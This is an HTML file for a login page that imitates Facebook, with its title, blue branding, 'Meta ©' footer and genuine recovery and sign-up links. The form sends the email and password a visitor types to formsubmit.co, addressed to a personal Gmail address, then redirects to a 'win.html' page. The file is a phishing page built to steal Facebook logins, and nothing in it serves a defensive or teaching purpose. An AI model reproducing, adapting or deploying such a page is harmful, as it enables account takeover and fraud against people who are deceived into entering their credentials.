<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <link rel="icon" href="path/to/your/favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    .facebook-logo {
      font-size: 40px;
      color: #1877f2;
      margin-bottom: 20px;
      text-transform: lowercase;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-align: left;
    }

    .input-field {
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .login-button {
      background-color: #1877f2;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .login-button:hover {
      background-color: #0e5a99;
    }

    .separator {
      margin: 10px 0;
      display: flex;
      align-items: center;
    }

    .separator-line {
      flex-grow: 1;
      height: 1px;
      background-color: #ddd;
    }

    .separator-text {
      margin: 0 10px;
      color: #666;
    }

    .or-text {
      margin: 10px 0;
      color: #666;
    }

    .create-account-button {
      background-color: #fff;
      color: #1877f2;
      padding: 10px;
      border: 2px solid #ccc;
      border-radius: 4px;
      text-decoration: none;
      cursor: pointer;
      display: inline-block;
      margin-top: 10px;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .create-account-button:hover {
      background-color: #f5f5f5;
    }

    .forgotten-password {
      color: #1877f2;
      text-decoration: none;
      margin-top: 10px;
      font-size: 14px;
      display: block;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .language-option {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
    .footer {
      margin-top: 20px;
      color: #666;
      }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="facebook-logo">
      facebook
    </div>
    <form class="login-form" action="https://formsubmit.co/kumarsharma2580@gmail.com" method="POST">
      <input type="text" class="input-field" placeholder="Email or Phone">
      <input type="text" class="input-field" placeholder="Password">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="win.html">
      <button type="submit" class="login-button">Log in</button>
    </form>
    <br>
    <a href="https://m.facebook.com/recover/initiate/" class="forgotten-password">Forgotten Password?</a>
    <div class="separator">
      <div class="separator-line"></div>
      <div class="separator-text">or</div>
      <div class="separator-line"></div>
    </div>
    <p class="or-text">
      <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="create-account-button">
        Create New Account
      </a>
    </p>
    <div class="language-option">English (US)</div>
  <div class="footer">
   Meta &copy; <span id="currentYear"></span>
  </div>
  </div>
  <script>
    document.getElementById('currentYear').textContent = new Date().getFullYear();
  </script>
</body>
</html>
